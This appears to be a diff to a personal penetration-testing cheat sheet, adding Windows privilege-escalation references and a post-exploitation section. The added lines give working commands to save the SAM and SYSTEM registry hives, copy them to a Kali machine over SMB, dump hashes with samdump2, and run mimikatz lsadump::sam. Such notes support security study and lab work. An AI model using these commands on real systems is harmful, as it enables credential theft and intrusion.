@@ -16,14 +16,35 @@
     
  3. Privilege Escalation
     3.1 Linux
-    3.2 Windows
+    3.2 Windows            ref: https://guif.re/windowseop#EoP%204:%20Pass%20the%20hash
         3.2.1 UAC Bypass   ref: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
             Run whoami /priv
             Look for SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
             Download: https://github.com/turbo/zero2hero  
             
             
+  4. Post-Exploitation
+    4.1 Linux
+    4.2 Windows            ref : https://samsclass.info/123/proj10/px16-hashcat-win.htm
+        4.2.1 Saving Creds         
+            4.2.1.1 Manual
+                Windows Hash: Security Accounts Manager
+                    reg save HKLM\SAM c:\SAM
+                    reg save HKLM\System c:\System
+                        --> Then smbserver to save back to kali. 
+                    samdump2 System SAM
+            4.2.1.2 Auto
+                Gain admin priviliege
+                Run mimikatz
+                    privilege::debug
+                    token::elevate
+                    lsadump::sam
 
+
+
+
+
+https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
 
 
 Windows x86 Machine powershell location
